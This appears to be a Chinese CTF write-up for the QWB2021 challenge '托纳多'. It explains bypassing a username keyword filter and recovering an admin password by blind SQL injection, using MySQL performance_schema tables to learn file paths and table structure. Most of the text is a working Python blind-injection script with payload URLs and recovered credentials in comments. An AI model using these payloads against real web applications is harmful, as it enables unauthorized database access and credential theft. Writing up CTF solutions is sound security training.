---
title: '[QWB2021 Quals]托纳多'
date: 2025-03-16 21:45:31
tags:
---

## [QWB2021 Quals]托纳多

我们在自己的注册页面的用户名上发现了明显的过滤

当我们输入`",#,sys,<,>,=, like ,tables ,coluns `等关键字时会报错

所以我们在第一步需要拿到admin的密码

参考 https://guokeya.github.io/post/SZkQ4b1G/

guoke师傅使用了performance_schema.file_instances来拿到数据库文件路径

例如test数据库，数据库文件路径就是/var/lib/mysql/test/表.frm

![image-20250316215342826](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503162153999.png)

下一步我们需要知道表结构

mysql会记录执行的sql语句到`performance_schema.events_statements_summary_by_digest`,同理`select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest`即可得到表结构

```py
import requests
import time
for a in  range(1,300):
    for i in range(130,-1,-1):
        if(i<30):
            exit(0)
        url = "http://f96ea2c5-35a7-444f-8eee-4a086e4797dd.node3.buuoj.cn/register.php?username=' or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e )," + str(a) + ",1)) in (" + str(i) + ")),1,0) or '0&password=12"
        #admin~we111c000me_to_qwb
        #url = "http://eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888/register.php?username=' or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in ('qwb') limit 2,1),"+str(a)+",1)) in ("+str(i)+")),1,0) or '0&password=12"
        #INSERT INTO `qwbtttaaab111e` ( `qwbqwbqwbuser` , `qwbqwbqwbpass` ) VALUES (...)
        #url = "http://eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888/register.php?username=' or  if((ascii(substr((select (file_name)  FROM performance_schema.file_instances limit 150,1),"+str(a)+",1)) in ("+str(i)+")),1,0) or '0&password=12"
        time.sleep(0.5)
        r = requests.get(url)
        if 'this username' in r.text:
            print(chr(i),end='')
            break
        else:
            if('success' in r.text):
                pass
            else:
                print(r.text)
```

